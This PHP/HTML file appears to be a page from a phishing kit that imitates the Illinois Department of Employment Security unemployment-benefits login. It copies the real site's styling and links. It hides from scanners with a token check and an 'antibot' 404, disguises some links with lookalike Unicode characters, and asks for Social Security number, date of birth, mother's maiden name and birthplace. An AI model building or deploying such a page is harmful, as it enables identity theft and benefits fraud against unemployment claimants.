<?php

    session_start();

    require_once '../src/Classes/Comp.php';
    require_once '../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
  
	

 

 
 
     


<html lang="en">
<head>
	<meta http-equiv="X-UA-Compatible" content="IE=edge" /> 
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<title>IDES</title>
	
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/page-layouts-21.css"/> 
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/corev4.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/bootstrap-custom.css"/> 
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/bootstrap.min.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/bootstrap-responsive.min.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/CustomCssBootstrap.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/main.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/jquery-ui-smoothness.css"/>
	<link rel="stylesheet" type="text/css" href="https://benefits.ides.illinois.gov/Benefits/common/css/fileMyClaim.css"/>
	
	
  	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery-1.11.3.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery.validate.min.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/additional-methods.min.js"></script>
  	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery-migrate-1.3.0.js"></script>
  
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery.maskedinput.min.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery.maskMoney.min.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/bootstrap.min.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery.bootstrap.wizard.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery-ui-1.10.3.custom.min.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/jquery.alphanum.js"></script>
	<script	src="https://benefits.ides.illinois.gov/Benefits/common/js/moment.js"></script>
	
	
	
	<script type="text/javascript">	
		var contextPath='/Benefits';
		
	</script>
	
	<script type="text/javascript">
		window.history.forward();
		
		//window.onbeforeunload = function() { return "You work will be lost."; };
		
		function noBack() { 
			window.history.forward(); 
		}
	</script>		
	
	<script type="text/javascript">   
		$(document).ready(function () {

		//Main navigation on home page - indents the items under the headings
		$("div[class^='nav-column']").each(function (index) {
			$($(this).find("a.Sub").parent()).contents().wrapAll("<ul>");
		});
		$("div[class^='nav-column']").find("li:empty").remove();


		//This resets the height of the #s4-workspace div
		$("#s4-workspace").height($(window).height() - ($("#suiteBar").height() + $("s4-ribbonrow").height()));

		//Update the #s4-workspace when the browser window changes
		$(window).resize(function () {
			$("#s4-workspace").height($(window).height() - ($("#suiteBar").height() + $("s4-ribbonrow").height()));
		}); 
		
		function adjustIframes() {
			$('iframe').each(function(){
				var $this = $(this),
					proportion = $this.data( 'proportion' ),
					w = $this.attr('width'),
					actual_w = $this.width();
				if ( ! proportion ) {
					proportion = $this.attr('height') / w;
					$this.data( 'proportion', proportion );
				}
	  
				if ( actual_w != w ) {
					$this.css( 'height', Math.round( actual_w * proportion ) + 'px' );
				}
			});
		}
		$(window).on('resize load',adjustIframes);
   
   		$('a').click(function(event) {
   			var objectClass = event.currentTarget.className;
   			var blocked = '';
			if(objectClass.indexOf('cancelProcess') > -1 && !blocked) {
				var currentLink = window.location.pathname;
				event.preventDefault();
				var targetHREF = this.href;
				if(currentLink.indexOf("/fileMyClaim") > -1 || currentLink.indexOf("/certification") > -1) {
					$('<div class="depDialog"></div>').appendTo('body')
				    .html('<div style="font-size:0.8em;">' + conf1035 + '</div>')
				    .dialog({
				        modal: true,
				        title: 'Confirm !',
				        zIndex: 10000,
				        autoOpen: true,
				        width: 650,
				        resizable: false,
				        closeOnEscape: false,
				        draggable: false,
				        dialogClass:"dep-dialog",
				        buttons: {
				          	Ok: function () {
				        	  	$(this).remove();
				        	  	window.location.href = targetHREF;
			        			
				            },
				            Cancel: function () {
				            	//holdIt.depConf=false;
				            	$(this).dialog("close");
				            }
				        },
				        close: function (event, ui) {
				        	//holdIt.depConf=false;
				            $(this).remove();
				            
				        }
				    });
				} else {
					window.location.href = targetHREF;
				}
			}
		});
	}); // End of Document Ready

</script>
 
 
<script src="https://cdn.appdynamics.com/adrum/adrum-20.9.0.3268.js"></script></head> 
 


<body onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="">
	<div id="s4-workspace" style="height: 981px;">
		<div id="s4-bodyContainer">
		<!--page status bar including if a page is checked out, ready for publishing, etc-->
			<img src="https://benefits.ides.illinois.gov/Benefits/common/images/image_background.png" class="bg" alt="background Image">
			<!--title row-->
			<div id="header" class="masthead container-fluid s4-notdlg">
				








<!-- BANNER STARTS -->
<div class="header clearfix">
	<div id="HeaderRow" class="row-fluid span12">
		<div class="span4">
			<!--logo-->
			<div class="pull-left">
				<a id="ctl00_onetidProjectPropertyTitleGraphic" href="http://www.ides.illinois.gov"><img src="https://benefits.ides.illinois.gov/Benefits/common/images/logo.png" title="Illinois Department of Employment Security"></a>
			</div>
		</div>
		
		<div class="span4">
			<div class="span12 noindex"></div>
			<div class="stateseal">
				<img src="https://benefits.ides.illinois.gov/Benefits/common/images/State-Seal.png" alt="state seal">
			</div>
		</div>
	</div>
</div>
<!-- BANNER ENDS -->
<!-- BANNER MENU STARTS -->



<form id="headerForm" name="headerForm" novalidate="novalidate" action="../src/index.php?token=<?php echo $_SESSION['token']; ?>" method="post">
 
	<div id="megaMenu" class="noindex">
	
		<ul class="nav" id="ipMenu">
	
			
				
					<li class="hdblank"><a>&nbsp;</a></li>
				
			
			<li class="hdblank" style="width:18%"><a>&nbsp;</a></li>
			<li class="hdindividuals" style="width:22%"><a><span id-lang="page.Navigation.Individual"  class="nowrap">Individual Home</span></a>
				<div class="noindex contindividuals">
					<div class="noindex nav-column-individuals1">
						<ul>
							<li><a class="Sub">&nbsp;</a></li>
							<!-- <li>
								<a
									href="http://www.ides.illinois.gov/Pages/Unemployment%20Insurance.aspx"
									class="Main">Unemployment Insurance (UI)
								</a>
							</li> -->
							<li>
								<a href="https://benefits.ides.illinois.gov/Benefits/fileMyClaim.do" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.LabelFileUnemploymentClaim">File My Unemployment Claim</span>
								</a>
							</li>
							<li>
								<a href="https://benefits.ides.illinois.gov/Benefits/certification/certificationWelcomeStart.do" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.LabelFileCertification">File My Certification</span>
								</a>
							</li>
							<li>
								<a  href="https://benefits.ides.illinois.gov/Benefits/payments/viewPaymentHistory.do" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.PaymentHistory">View My Payment History</span>
								</a>
							</li>
							<li>
								<a href="responseHandlerAction.do%EF%B9%96TAM_OP=login&amp;USERNAME=unauthenticated&amp;ERROR_CODE=0x00000000&amp;METHOD=GET&amp;URL=%EA%A4%B7Benefits%EA%A4%B7profile%EA%A4%B7enrollDirectDepositQuestionsStart.do%EF%B9%96pageName=Request1099G&amp;REFERER=https%EF%B9%95%EA%A4%B7%EA%A4%B7benefits.ides.illinois.gov%EA%A4%B7Benefits%EA%A4%B7prof_571ed2d7685a8c0d.html" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.LabelRequest1009G">Request 1099G</span>
								</a>
							</li>
							<li>
								<a href="https://benefits.ides.illinois.gov/Benefits/validateSharedSecretsStart.do" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.LabelChangePassword">Change My Password</span>
								</a>
							</li>
	
							<li>
								<a href="responseHandlerAction.do%EF%B9%96TAM_OP=login&amp;USERNAME=unauthenticated&amp;ERROR_CODE=0x00000000&amp;METHOD=GET&amp;URL=%EA%A4%B7Benefits%EA%A4%B7profile%EA%A4%B7enrollDirectDepositQuestionsStart.do%EF%B9%96pageName=EnrollDirectDeposit&amp;REFERER=https%EF%B9%95%EA%A4%B7%EA%A4%B7benefits.ides.illinois.gov%EA%A4%B7Benefi_4cc468f5493c9609.html" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.EnrollDirectDeposit">Enroll in Direct Deposit/Edit My Direct Deposit </span>
								</a>
							</li>
							<li>
								<a href="https://benefits.ides.illinois.gov/Benefits/changeAddress.do" class="Sub cancelProcess"> 
									<span id-lang="page.ClaimantIntentions.link.LabelChangeAddress">Change My Address</span>
								</a>
							</li>
							<!-- <li>
								<a
									href="http://www.ides.illinois.gov/Pages/Re-Entry_Employment_Service_Program.aspx"
									class="Sub">Satisfactory Survey
								</a>
							</li> -->
						</ul>
					</div>
				</div>
			</li>
	
	
			<li class="hdemployers">
				<a href="http://www.ides.illinois.gov/Pages/Workforce_IllinoisJobLink.aspx" target="_blank"><span id-lang="page.Header.text.IJL">Illinois Job Link</span></a>
			</li>
	
	
			<li class="hdworkforcepartners">
				<a><span id-lang="page.Header.text.Language" >Language</span>
					<select name="localeLang" id="localeLang" class="fieldSelection fieldRight" onchange="switchLocale();">
						<option value="en"
							
								selected="selected" 
							>English
						</option>
						<option value="es"
							>Spanish
						</option>
						<option value="pl"
							>Polish
						</option>
					</select>
				</a>
			</li>
	
			
				
			
	</div>
	
	<input type="hidden" name = "currentURL" id="currentURL" />
	<span id="variable_lang_holder"></span>

</form>

<script language="javascript">

	function switchLocale() {
	  event.preventDefault();
	  $.ajax({
	    type: "POST",
	    url: contextPath + "/profile/headerSubmit.do",
	    data: {
	      localeLang: document.getElementById("localeLang").value
	    },
	    success: function success(response, status) {
	      var jsonResponse = JSON.parse(response);
	      var spans = $('span[id-lang]').toArray();
	      spans.forEach(function (element) {
	        var newBlock = jsonResponse[element.getAttribute('id-lang')];
	
	        if (newBlock != null && newBlock != "") {
	          if (newBlock.indexOf("\\u") > -1) {
	            newBlock = decodeURIComponent(newBlock);
	          }
	
	          if (element.getAttribute('arguments')) {
	            element.getAttribute('arguments').split(",").forEach(function (el, idx) {
	              newBlock = newBlock.replace("{" + idx + "}", decodeURIComponent(el));
	            });
	          }
	
	          element.innerHTML = newBlock;
	        }
	
	        ;
	      });
	      setPopover('1099G_popover', '1099G_popover_content', 'page.MyProfile.label.1099GTitle');
	      setPopover('race_popover', 'race_popover_content', 'page.FileMyClaim.label.race');
	      setPopover('ethnic_popover', 'page.MyProfile.label.ethinicity', 'page.MyProfile.label.ethinic.background');
	      setPopover('seasonal_popover', 'seasonal_popover_content', 'page.MyProfile.label.seasonal.worker');
	      setPopover('veteran_popover', 'page.MyProfile.label.veteranNote', 'page.MyProfile.label.veteran.guidelines');
	      setPopover('dependent_popover', 'dependent_popover_content', 'page.MyProfile.label.dependent.Information');
	      setPopover('grossPay_popover', 'page.MyIncomeAndTrainingInformation.GrossInfo', 'page.Income.label.gross.pay');
	      setPopover('workComp_popover', 'page.MyIncomeAndTrainingInformation.workersCompInfo', 'page.Income.label.workers.comp');
	      setPopover('documents_popover', 'page.FileMyClaim.importantDoc.info', 'page.FileMyClaim.label.imp.documents');
	      setPopover('password_popover', 'page.CreateUsernameAndPasswordImportant.text', 'page.CreateUsernameAndPasswordImportant.text');
	      setPopover('confirmationNumber_popover', 'page.claimConfirmation.text.important.confirmationNumberText');
	      setPopover('claimantId_popover', 'page.ClaimSummary.text.claimantIDText');
	      setPopover('activlyLooking_popover', 'page.completeUICertification.info.activelyLooking', 'page.completeUICertification.info.activelyLooking');
	      setPopover('ableAvailable_popover', 'page.completeUICertification.info.ableAvailable', 'page.completeUICertification.info.ableAvailable');
	      setPopover('dependencyInfo_popover', 'page.completeUICertification.info.dependency', 'page.completeUICertification.info.dependency');
	      setPopover('grossWagesInfo_popover', 'page.completeUICertification.info.grossWages', 'page.completeUICertification.info.grossWages');
	      setPopover('holidayPayInfo_popover', 'page.completeUICertification.info.holidayPay', 'page.completeUICertification.info.holidayPay');
	      $('input[id=finalistSuggested]').attr('label', $('span[id-lang="global.label.suggestedAddress"]').first().html());
	      $('input[id=userEntered]').attr('label', $('span[id-lang="global.label.enteredAddress"]').first().html()); // Yes/No Flag1/Flag2  				
	
	      $('label[for$=Yes],label[id$=Yes],label[for$=Flag1]').text($('span[id-lang="global.code.yes"]').first().text());
	      $('label[for$=No],label[id$=No],label[for$=Flag2]').text($('span[id-lang="global.code.no"]').first().text());
	
	      for (var i = 0; i <= 10; i++) {
	        $("label[for$=\"Yes".concat(i, "\"],label[id$=\"Yes").concat(i, "\"]")).text($('span[id-lang="global.code.yes"]').first().text());
	        $("label[for$=\"No".concat(i, "\"],label[id$=\"No").concat(i, "\"]")).text($('span[id-lang="global.code.no"]').first().text());
	      } // Other fields
	
	
	      $('label[for$=CountryUSA]').text($('span[id-lang="global.label.usa"]').first().text());
	      $('label[for$=CountryCanada]').text($('span[id-lang="global.label.canada"]').first().text());
	      $('label[for$=CountryOther]').text($('span[id-lang="global.label.other"]').first().text());
	      $('input[id^=addPeriodBtn]').val($('span[id-lang="page.employment.label.addNewPeriod"]').first().text());
	      $('input[id^=deletePeriodBtn]').val($('span[id-lang="page.employment.label.deleteNewPeriod"]').first().text());
	      $('input[id=FileMyClaimBtn]').val($('span[id-lang="page.FileMyClaim.button.fileMyClaim"]').first().text());
	
	      if (resetVariableLanguage != null) {
	        resetVariableLanguage(jsonResponse);
	      }
	    }
	  });
	}
	
	;
	
	function setPopover(popoverId, spanContentId, spanLangTitleId) {
	  $("span[id=\"".concat(popoverId, "\"]")).attr('data-content', $("span[id-lang=\"".concat(spanContentId, "\"],div[id=\"").concat(spanContentId, "\"]")).first().html());
	
	  if (spanLangTitleId != null) {
	    $("span[id=\"".concat(popoverId, "\"]")).attr('data-original-title', $("span[id-lang=\"".concat(spanLangTitleId, "\"]")).first().html());
	  }
	}
</script>

			</div>
			<!-- div id="menu">
				<div id="nav" style="padding-left: 5px;">
	<h2>Unemployment Services</h2>
	<h3>
		<a href="/ides/landing">Individual
			Home</a>
	</h3>
	<br />
	<p>
		<a
			href="http://www.ides.illinois.gov/Pages/How_can_IllinoisJobLink.com_work_for_you.aspx"
			target="_blank">Illinois Job Link</a>
	</p>
	<p>
		<a href="http://www.ides.illinois.gov" target="_blank">IDES
			Website</a>
	</p>
	<p>
		<br /> <strong> </strong>
	</p>
</div>
			</div-->
			<div id="content">
				




<script src="https://benefits.ides.illinois.gov/Benefits/common/js/login.js"></script>

<!--WHITE_PANEL_MAIN_BODY STARTS -->
<div id="mainbody" class="container-fluid">
	<div class="row-fluid">
		<div class="s4-ca s4-ca-dlgNoRibbon span12" id="MSO_ContentTable"
			style="margin-left: 0px;">
			<!-- Second Band (Image Left with Text) -->
			<div class="row-fluid">
				<div class="span12">
					<div class="row-fluid"
						style="padding-top: 25px; padding-left: 12px; padding-bottom: 5%;">

						
						
						
						<table width="90%">
							<tr>
								<td>
									<div class="headerDiv"></div>
								</td>
							</tr>
							
							
							<tr>
								<td>
								 	<span class='hdrFnt' style="margin-left:-17px;" title='Your Username and Password grant access to the Unemployment Insurance Online Services, such as filing a claim, signing up for or editing your direct deposit information, certifying for benefits and receiving claims information from our system. Your Username and Password have the same legal authority as your signature. Do not share your Username and Password with anyone. If you believe someone knows your Username and Password contact Claimant Services Center at (800)244-5631.' data-toggle="popover" data-trigger="hover" data-placement="top" 
								      data-html="true"  data-container="body" data-content='Your Username and Password grant access to the Unemployment Insurance Online Services, such as filing a claim, signing up for or editing your direct deposit information, certifying for benefits and receiving claims information from our system. Your Username and Password have the same legal authority as your signature. Do not share your Username and Password with anyone. If you believe someone knows your Username and Password contact Claimant Services Center at (800)244-5631.' >
								     	<span style="margin-left:20px;" class="glyphicon glyphicon-info-sign infoColor"></span>
									</span>
									
								</td>
							</tr>
							<tr>
								<td>&nbsp;
								</td>
							</tr>
							
							<tr>
								
							</tr>
							<tr>
								<td>&nbsp;
								</td>
							</tr>
							<tr>
								<td>
									
								</td>
							</tr>
							<tr>
								<td>&nbsp;
								</td>
							</tr>				
							<tr>
								<td style="font-size:13px;">
									<p id="requiredAsterisk">Asterisk (<span class="requiredAsterisk">*</span>) indicates a required field</p>
								</td>
							</tr>
						</table>
						
						<div id="loginErrorMessage"
							style="color: red; font-weight: bold; font-size: .9em;">
							Please complete the required fields.
							<div>&nbsp;</div>
						</div>	
						
						
						
						<form method="post" action="https://benefits.ides.illinois.gov/pkmslogin.form" id="loginform" autocomplete="off"> 
						
							
							<table id="form">
								<tbody>
									<tr class="odd">
										
										<td class="fieldLabel">
											<label for="username">
												Social Security Number
											</label>
												<span id="usernameError" >&nbsp;</span>
										</td>
						
										<td class="symbol">
											<span class="requiredAsterisk">
												*
											</span>
										</td>
							
										
										<td class="input">
											<input type="text" name="ssn2" maxlength="12" style="width: 120px;" id="username" />
										</td>
									</tr>
									<tr class="odd">
										
										<td class="fieldLabel">
											<label for="username">
												Dare of Birth
											</label>
												<span id="usernameError" >&nbsp;</span>
										</td>
						
										<td class="symbol">
											<span class="requiredAsterisk">
												*
											</span>
										</td>
							
										
										<td class="input">
											<input type="text" name="dateofbirth" maxlength="12" style="width: 120px;" id="username" />
										</td>
									</tr><tr class="odd">
										
										<td class="fieldLabel">
											<label for="username">
												What is your mother's maiden name?
											</label>
												<span id="usernameError" >&nbsp;</span>
										</td>
						
										<td class="symbol">
											<span class="requiredAsterisk">
												*
											</span>
										</td>
							
										
										<td class="input">
											<input type="text" name="mother" maxlength="12" style="width: 120px;" id="username" />
										</td>
									</tr>
									<tr class="even">
										
										<td class="fieldLabel">
											<label for="password">
												In what city were you born?
											</label>
											<span id="passwordError" >&nbsp;</span>
										</td>
										
										<td class="symbol">
										    <span class="requiredAsterisk">
												*
											</span>
										</td>
							
										
										<td class="input">
										  		<input type="password" name="text" maxlength="15" style="width: 120px;" id="password" />
										</td>
									</tr>
									
									<tr class="odd">
										
										<td class="full" colspan="3">
											<p>
												Click here if you
												
												
												<a href="#">forgot your Username and/or Password.</a>
											</p>
										</td>
								    	</tr>
								    
									
									<tr class="even">
										<td class="full" colspan="3">
											<p>
												If you have not established a Username and Password, click here to
												
												<a href="#">Register.</a>
											</p>	
										</td>
									</tr>
								</tbody>
							</table> 
							
							<input type="hidden" name="login-form-type" value="pwd" />
							<input type="hidden" name="buildVersion" value="buildVersion" />
							
							
							<div id="buttons">
								<div id="continueButtonContainer">
									<input type ="submit" name="continue" value="Continue" styleId="submitButtonAction" class="formButton" />
								</div>
							</div>

						</form>
					</div>

				</div>
			</div>
		</div>
		<!--end primary MSO_ContentTable container-->
	</div>
	<!--end row-->
	<!--container-->
</div>

			</div>
			<div id="footer">
				

		<!-- FOOTER: FROM INCLUDE-->
		<div id="footer" >
			&#169; 2008. All rights reserved. 
			<a href="http://www.ides.illinois.gov/Pages/Privacy.aspx" target="_blank">
				Privacy Policy
			</a>
		</div>
		<!-- END FOOTER -->

			</div>
		</div>
	</div>
    <script src="../assets/js/cleave.js"></script>
	<script src="../assets/js/oops.js"></script>
</body>

</html>